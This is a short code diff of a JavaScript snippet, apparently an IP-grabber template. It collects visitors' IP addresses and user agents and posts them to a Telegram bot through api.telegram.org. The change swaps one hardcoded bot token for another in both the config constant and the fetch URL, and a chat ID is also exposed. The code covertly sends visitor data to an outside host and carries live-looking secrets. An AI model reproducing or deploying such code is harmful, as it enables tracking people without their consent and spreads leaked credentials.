@@ -1,5 +1,5 @@
 // plz edit your bot's configuration
-const BOT_TOKEN = '8142350707:AAE-TB114Qn98QnyPQzIWtrAeusTfqD5LKU'; // Replace with your bot's TOKEN
+const BOT_TOKEN = '8142350707:AAHxtMnqC6CL621-kv1LlWQhW62M-Ocre6Y'; // Replace with your bot's TOKEN
 const CHAT_ID = '5576221331'; // Replace with your bot's chat ID
 
         function sendIPAndUserAgent() {
@@ -15,7 +15,7 @@ const CHAT_ID = '5576221331'; // Replace with your bot's chat ID
         }
 
         function sendMessageToTelegram(message) {
-            fetch(`https://api.telegram.org/bot8142350707:AAE-TB114Qn98QnyPQzIWtrAeusTfqD5LKU/sendMessage`, {
+            fetch(`https://api.telegram.org/bot8142350707:AAHxtMnqC6CL621-kv1LlWQhW62M-Ocre6Y/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
